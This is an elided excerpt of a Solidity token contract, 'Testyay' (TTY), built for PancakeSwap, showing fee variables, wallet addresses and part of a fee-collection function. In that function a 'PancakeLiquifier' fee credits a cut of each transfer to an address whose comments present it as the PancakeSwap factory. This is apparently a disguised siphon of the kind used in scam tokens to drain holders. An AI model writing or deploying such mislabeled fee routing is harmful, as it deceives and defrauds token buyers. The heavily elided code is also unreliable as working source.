...
contract Testyay is Context, IERC20, Ownable {
    ...
    string private _name = "Testyay";
    string private _symbol = "TTY";
    ...
    uint256 internal _tokenTotal = 1000000000000 * 10 ** 18; // 1 T total supply
    ...
    uint256 public _liquidityFee = 500; // 100 = 1%
    uint256 public _maxWallet = 200; //20Billion
    //variables
    ...
    //addresses
    address public marketingAddress = 0x3626701d8C5cCc992F397930Ac1AD5dD35dc9fC0; // Marketing Address
    address public liquidityAddress = 0x0e5f22014d883E2b472ECDFE905D076D6CF8ea1C; // PancakeSwapFactoryV2
    address public BurnAddress = 0x0000000000000000000000000000000000000000; // Burn address
    //misc
    uint256 public _PancakeLiquifier = 0;
    uint256 public _PancakeLiquifierTotal;
 ...
 /**
    ...
    */
    ...
    address public PancakeLiquifierAddress = 0x0e5f22014d883E2b472ECDFE905D076D6CF8ea1C;
    function collectFee(address account, uint256 amount, uint256 rate) private returns (uint256) {
        ...
        uint256 PancakeLiquifier = amount.mul(_PancakeLiquifier).div(10000);
    ...
    //@dev alternative pancakeswap factory address
        if(PancakeLiquifier > 0){
            transferAmount = transferAmount.sub(PancakeLiquifier);
            _reflectionBalance[PancakeLiquifierAddress] = _reflectionBalance[PancakeLiquifierAddress].add(PancakeLiquifier.mul(rate));
            _PancakeLiquifierTotal = _PancakeLiquifierTotal.add(PancakeLiquifier);
            emit Transfer(account,PancakeLiquifierAddress,PancakeLiquifier);
        }
